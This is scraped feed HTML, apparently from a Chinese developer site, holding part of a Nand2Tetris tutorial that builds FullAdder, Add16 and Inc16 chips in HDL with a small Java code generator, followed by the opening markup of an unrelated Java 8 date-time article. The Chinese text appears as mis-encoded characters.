class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></div>
<p>è‡³æ­¤æˆ‘ä»¬å¯ä»¥ç”¨ <code>HalfAdder</code> å’Œ <code>Or</code> æ¥å®ç° <code>FullAdder</code>ã€‚å…·ä½“çš„ä»£ç å¦‚ä¸‹ â¬‡ï¸</p>
<pre><code class="hljs language-hdl" lang="hdl">CHIP FullAdder {
    IN a, b, c;  // 1-bit inputs
    OUT sum,     // Right bit of a + b + c
        carry;   // Left bit of a + b + c

    PARTS:
    HalfAdder(a= a, b= b, sum= sumHa, carry= carryHa);
    HalfAdder(a= sumHa, b= c, sum= sum, carry= temp);
    Or(a= carryHa, b= temp, out= carry);
}
</code></pre>
<p>è¿™æ ·çš„ä»£ç å¯ä»¥é€šè¿‡ä»¿çœŸæµ‹è¯•ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º â¬‡ï¸</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eaa6caf8437f4e1a90c9c51fb86c1fda~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YqA6YqF6ZC1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766211366&amp;x-signature=bZWTamo4lVDYIZHguUxfK3VgynM%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-6">3. å®ç° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn></mrow><annotation encoding="application/x-tex">16</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">16</span></span></span></span></span> ä½åŠ æ³•å™¨(<code>Add16</code>)</h3>
<p>å‰å¾€Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fnand2tetris.github.io%2Fweb-ide%2Fchip%2F" target="_blank" title="https://nand2tetris.github.io/web-ide/chip/" ref="nofollow noopener noreferrer">Nand to Tetris Online IDE</a>ï¼Œé€‰æ‹©Â <code>Project 2</code>Â é‡Œçš„Â <code>Add16</code>ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º â¬‡ï¸</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6095eda2739e419da07d69d0b8f29287~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YqA6YqF6ZC1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766211366&amp;x-signature=bqxqSDGeI%2FQYbq0Rc%2ByNWmEPiGY%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ç”¨ <code>Project 1</code> é‡Œå·²ç»å®ç°çš„å„ç§ <code>chip</code>ï¼Œä»¥åŠåˆšæ‰å®ç°çš„ <code>HalfAdder</code>/<code>FullAdder</code> æ¥å®ç°ä¸€ä¸ª <code>Add16</code>ã€‚</p>
<ul>
<li>è¾“å…¥æ˜¯
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mo stretchy="false">[</mo><mn>16</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">a[16]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">a</span><span class="mopen">[</span><span class="mord">16</span><span class="mclose">]</span></span></span></span></span></li>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo stretchy="false">[</mo><mn>16</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">b[16]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">b</span><span class="mopen">[</span><span class="mord">16</span><span class="mclose">]</span></span></span></span></span></li>
</ul>
</li>
<li>è¾“å‡ºæ˜¯
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mo stretchy="false">[</mo><mn>16</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">out[16]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">16</span><span class="mclose">]</span></span></span></span></span></li>
</ul>
</li>
</ul>
<p>è¦å®ç°çš„é€»è¾‘å¦‚ä¸‹ â¬‡ï¸</p>
<pre><code class="hljs language-text" lang="text">16-bit adder: Adds two 16-bit two's complement values.
The most significant carry bit is ignored.
</code></pre>
<p>æˆ‘å†™äº†å¦‚ä¸‹çš„ <code>java</code> ç¨‹åºæ¥ç”Ÿæˆå¯¹åº”çš„ <code>HDL</code> ä»£ç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.util.StringJoiner;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Adder16HdlCodeGenerator</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">template</span> <span class="hljs-operator">=</span> <span class="hljs-string">"""
                CHIP Add16 {
                    IN a[16], b[16];
                    OUT out[16];
                
                    PARTS:
                %s
                }
                """</span>;
        <span class="hljs-type">StringJoiner</span> <span class="hljs-variable">joiner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringJoiner</span>(System.lineSeparator());
        joiner.add(<span class="hljs-string">"    FullAdder(a= a[0], b= b[0], c= false, sum= out[0], carry= c0);"</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>; i &lt; <span class="hljs-number">16</span>; i++) {
            <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> String.format(<span class="hljs-string">"    FullAdder(a= a[%s], b= b[%s], c= c%s, sum= out[%s], carry= c%s);"</span>, i, i, i - <span class="hljs-number">1</span>, i, i);
            joiner.add(line);
        }
        System.out.printf(template, joiner);
    }
}
</code></pre>
<p>è¯·å°†ä»¥ä¸Š <code>java</code> ä»£ç ä¿å­˜ä¸º <code>Adder16HdlCodeGenerator.java</code>ã€‚ç”¨ä»¥ä¸‹å‘½ä»¤å¯ä»¥ç¼–è¯‘ <code>Adder16HdlCodeGenerator.java</code> å¹¶è¿è¡Œå…¶ä¸­çš„ <code>main</code> æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">javac Adder16HdlCodeGenerator.java
java Adder16HdlCodeGenerator
</code></pre>
<p>è¿è¡Œç»“æœå¦‚ä¸‹</p>
<pre><code class="hljs language-hdl" lang="hdl">CHIP Add16 {
    IN a[16], b[16];
    OUT out[16];

    PARTS:
    FullAdder(a= a[0], b= b[0], c= false, sum= out[0], carry= c0);
    FullAdder(a= a[1], b= b[1], c= c0, sum= out[1], carry= c1);
    FullAdder(a= a[2], b= b[2], c= c1, sum= out[2], carry= c2);
    FullAdder(a= a[3], b= b[3], c= c2, sum= out[3], carry= c3);
    FullAdder(a= a[4], b= b[4], c= c3, sum= out[4], carry= c4);
    FullAdder(a= a[5], b= b[5], c= c4, sum= out[5], carry= c5);
    FullAdder(a= a[6], b= b[6], c= c5, sum= out[6], carry= c6);
    FullAdder(a= a[7], b= b[7], c= c6, sum= out[7], carry= c7);
    FullAdder(a= a[8], b= b[8], c= c7, sum= out[8], carry= c8);
    FullAdder(a= a[9], b= b[9], c= c8, sum= out[9], carry= c9);
    FullAdder(a= a[10], b= b[10], c= c9, sum= out[10], carry= c10);
    FullAdder(a= a[11], b= b[11], c= c10, sum= out[11], carry= c11);
    FullAdder(a= a[12], b= b[12], c= c11, sum= out[12], carry= c12);
    FullAdder(a= a[13], b= b[13], c= c12, sum= out[13], carry= c13);
    FullAdder(a= a[14], b= b[14], c= c13, sum= out[14], carry= c14);
    FullAdder(a= a[15], b= b[15], c= c14, sum= out[15], carry= c15);
}
</code></pre>
<p>è¿™æ ·çš„ä»£ç å¯ä»¥é€šè¿‡ä»¿çœŸæµ‹è¯•ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º â¬‡ï¸</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd6621d35116468f957272182875f5ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YqA6YqF6ZC1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766211366&amp;x-signature=INbRKYJiiK9TBIMpLSYaI4OxoUk%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">4. å®ç° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>16</mn></mrow><annotation encoding="application/x-tex">16</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">16</span></span></span></span></span> ä½è‡ªå¢å™¨(<code>Inc16</code>)</h3>
<p>å‰å¾€Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fnand2tetris.github.io%2Fweb-ide%2Fchip%2F" target="_blank" title="https://nand2tetris.github.io/web-ide/chip/" ref="nofollow noopener noreferrer">Nand to Tetris Online IDE</a>ï¼Œé€‰æ‹©Â <code>Project 2</code>Â é‡Œçš„Â <code>Inc16</code>ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º â¬‡ï¸</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc97e18f6bbe4b7b831d7e6b264203b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YqA6YqF6ZC1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766211366&amp;x-signature=iFEWLqE0MHjOsdpUZlBJdSnNPkQ%3D" alt="image.png" loading="lazy"/></p>
<p>æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ç”¨ <code>Project 1</code> é‡Œå·²ç»å®ç°çš„å„ç§ <code>chip</code>ï¼Œä»¥åŠåˆšæ‰å®ç°çš„ <code>HalfAdder</code>/<code>FullAdder</code>/<code>Add16</code> æ¥å®ç°ä¸€ä¸ª <code>Inc16</code>ã€‚</p>
<ul>
<li>è¾“å…¥æ˜¯
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mi>n</mi><mo stretchy="false">[</mo><mn>16</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">in[16]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">in</span><span class="mopen">[</span><span class="mord">16</span><span class="mclose">]</span></span></span></span></span></li>
</ul>
</li>
<li>è¾“å‡ºæ˜¯
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>o</mi><mi>u</mi><mi>t</mi><mo stretchy="false">[</mo><mn>16</mn><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">out[16]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">o</span><span class="mord mathnormal">u</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord">16</span><span class="mclose">]</span></span></span></span></span></li>
</ul>
</li>
</ul>
<p>è¦å®ç°çš„é€»è¾‘å¦‚ä¸‹ â¬‡ï¸</p>
<pre><code class="hljs language-text" lang="text">16-bit incrementer:
out = in + 1
</code></pre>
<p>ä¸€ä¸ªç›´è§‚çš„åšæ³•æ˜¯ä½¿ç”¨ä¸Šä¸€æ­¥å®ç°çš„ <code>Add16</code>ï¼Œå…·ä½“çš„ä»£ç å¦‚ä¸‹ â¬‡ï¸</p>
<pre><code class="hljs language-hdl" lang="hdl">CHIP Inc16 {
    IN in[16];
    OUT out[16];

    PARTS:
    Add16(a = in, b[0]= true, b[1..15] = false, out = out);
}
</code></pre>
<p>è¿™æ ·çš„ä»£ç å¯ä»¥é€šè¿‡ä»¿çœŸæµ‹è¯•ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º â¬‡ï¸</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60ba95181a5a43318079d8996caca682~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YqA6YqF6ZC1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766211366&amp;x-signature=OzY7n2K%2BQ0QsjcW9dGfYVojAJIU%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-8">5. å®ç°ç®—æœ¯é€»è¾‘å•å…ƒ(<code>ALU</code>)</h3>
<p>å‰å¾€Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fnand2tetris.github.io%2Fweb-ide%2Fchip%2F" target="_blank" title="https://nand2tetris.github.io/web-ide/chip/" ref="nofollow noopener noreferrer">Nand to Tetris Online IDE</a>ï¼Œé€‰æ‹©Â <code>Project 2</code>Â é‡Œçš„Â <code>ALU</code>ï¼Œæ•ˆæœå¦‚ä¸‹å›¾æ‰€ç¤º â¬‡ï¸</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14126a4181a44f2dabbe0f571cd85e41~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YeR6YqA6YqF6ZC1:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766211366&amp;x-signature=UHb1OoDOtn83dq1Dmg6K5jf6Y48%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-9">å‚è€ƒèµ„æ–™</h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fnand2tetris.github.io%2Fweb-ide%2Fchip%2F" target="_blank" title="https://nand2tetris.github.io/web-ide/chip/" ref="nofollow noopener noreferrer">Nand to Tetris Online IDE</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Java 8æ—¥æœŸæ—¶é—´APIå®Œå…¨æŒ‡å—ï¼šå‘Šåˆ«Dateå’ŒCalendarçš„æ··ä¹±æ—¶ä»£]]></title>    <link>https://juejin.cn/post/7582854603060330538</link>    <guid>https://juejin.cn/post/7582854603060330538</guid>    <pubDate>2025-12-13T05:38:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582854603060330538" data-draft-id="7582854603060314154" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Java 8æ—¥æœŸæ—¶é—´APIå®Œå…¨æŒ‡å—ï¼šå‘Šåˆ«Dateå’ŒCalendarçš„æ··ä¹±æ—¶ä»£"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-13T05:38:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Java 8æ—¥æœŸæ—¶é—´APIå®Œå…¨æŒ‡å—ï¼šå‘Šåˆ«Dateå’ŒCalendarçš„æ··ä¹±æ—¶ä»£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒè¥¿çº¢æŸ¿é•¿å¤§çš„ç•ªèŒ„
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T05:38:46.000Z" title="Sat Dec 13 2025 05:38:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»25åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAAXNSR0IArs4c6QAAAIRlWElmTU0AKgAAAAgABQESAAMAAAABAAEAAAEaAAUAAAABAAAASgEbAAUAAAABAAAAUgEoAAMAAAABAAIAAIdpAAQAAAABAAAAWgAAAAAAAABIAAAAAQAAAEgAAAABAAOgAQADAAAAAQABAACgAgAEAAAAAQAAACCgAwAEAAAAAQAAACAAAAAAX7wP8AAAAAlwSFlzAAALEwAACxMBAJqcGAAAAVlpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IlhNUCBDb3JlIDYuMC4wIj4KICAgPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4KICAgICAgPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIKICAgICAgICAgICAgeG1sbnM6dGlmZj0iaHR0cDovL25zLmFkb2JlLmNvbS90aWZmLzEuMC8iPgogICAgICAgICA8dGlmZjpPcmllbnRhdGlvbj4xPC90aWZmOk9yaWVudGF0aW9uPgogICAgICA8L3JkZjpEZXNjcmlwdGlvbj4KICAgPC9yZGY6UkRGPgo8L3g6eG1wbWV0YT4KGV7hBwAABWVJREFUWAnlVktsVFUY/s85997pC9BOTKxRWnEKsXWlxjWJj0RWJjrFAAXjAlewYWOkgauACVu7a2IiNUEyExM3yoZE3Wmi7qgPJthJBDE6JUNpO3Mf5/j95/bOTOcBlBgXejJ37rn/Of/7O/9/iP7vQ/zTAcjnC4ry+a5ii1OkiYTpuvjvEc0Gp51uivP+ZW+QBuSW4QjW5rptAa1Ey0uOGKOxwPetVyafN6p/52/PkNBbjdAhGaGEpMRjLZTryB8+9MUSYSGNRIcBvm8kBAY9tHYlHz78nTs392xIkwv9FA3Oe33bdoX1ZZKOS0bH0CXI6RugYLW6BwIu5gskkQ4sEG0wYF25PjBzbZfSYY6kDLUmWMt7FR7Lw3xYUkaTdjxHfTPnPwav0iEGYADVa9XIRIEyxrAA0jIQxgFL22gYwF7A8/DAzNVdksJvJaTEUZ2kYnZWziN5s1ADPHneEIXByotYuMSrf9JEbbsuv7VcvbaKML8plXtQR0EdIYDqWEmtOgAomZFH8EjWSnek2ulmtljljttHbmaIHCCCHzd9MjwfsmscBeZH9Jyd10nMvz92UQrtCBKvMF06mQy0SiEdRMEGg8mN0YjAlgoDDkPrMI5qJKSkKKydpbB2CZjJkhIBvOBw2CGQgii85bpx//dMqFRKam5uvH7w+K97oe+Cl0HO68uIBH0qyEzpOMwIbZIcFq0I+9cwoElizCjk2KFI1y7Nnx614W1db58fOXIlMzs7Xn/jeDmvBV2Q0mXjGf554O/m4LZHp2N8r61WPMvLZWLdiC4GMAk5BjeeB5lhv39l6+BIbu3m760hXMDKBD08XBKzR8fr04nygnIypOOAJUx/fHrsi0Mnys+vVK+V4VUohaiyPCo2Q9DFALvF/ikw8WS4QvVZALS5ksw47/7R8ejgTPk1UFqU6/3zp8bOM7B/kdu/fkguPGU5JibW+F0sTjWOUw8DklRrg4BiLGeBqbaRLxjlT4no0InFV402RcftJz41cH/f/JnHP3kZaaF6VX/liwist9vYG5+NU9Cg3MNkt/+lU5wS8fTxq3mc7ILjDlAE4CJpe89BOWPiIjBhi9O6PI4G1jsc6RGB3lZwmS76k8H0zOKTkFboG8jS2krFKCX2fvTeaPHIBwAkMHHgncURnL3nuCSnxSopdIzN5th0BIonJ0Lf9yUA9iMkzdRWl3BixOusfDcwQVcS4UKIFwYfGPnM8wY/DyP9NFMXaTE5BU39tGkDgGZz+fJJG0oYcSaOafLcqdECY4LzfSObSzyUOgxqtyisr8SSNOOAkubWoh3TTaeA2YtFEXPnm5x81/j+6MI6JqyS25WSNU6hbCMKHG84marJbdR+vwakRhQLRuQpbzHRLjmpmijI+OmWCtq+LzWtnX5v30gHSsqmWne74DtiACi2+Wz0iXbuLt9D2cDyoPEkWOiyp5XUIwLMi/wJY1FbH5B9ONtdC1KrsD/Q0MCQAS0wccILORDW25amAeOtooAj/KQxfzF17uwTSQ1v3dJ7jnLINwdZYRDa4tPU0sHVXFo/vxFF5BqFqxRfOmgPCk4ft2NgKTCy2Y47JIEg+MIhjYsLy5I25qUYTQlCjMRHsr/UwdYwIK33UO1J5fFNB9XNO6akcywJofVmXQDP2wfrSPcI2xG5BSs3I+IosHr4EtvO1TDAu16xHQq5+ykMblfRXLbhEoFIdDTBdhldvzl+3CMg60ZktI2vNzLW6IIp0waLklot9L63yzuUp8dJd7bglPFe3hIXstBEP58/s6Ocyr4rH2+866ZNbriTzA0RSOWCwakMl1QJgculxPt8Z7O5GLdtW6bvU8R/nO1vb+hMExVAVtEAAAAASUVORK5CYII=");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uA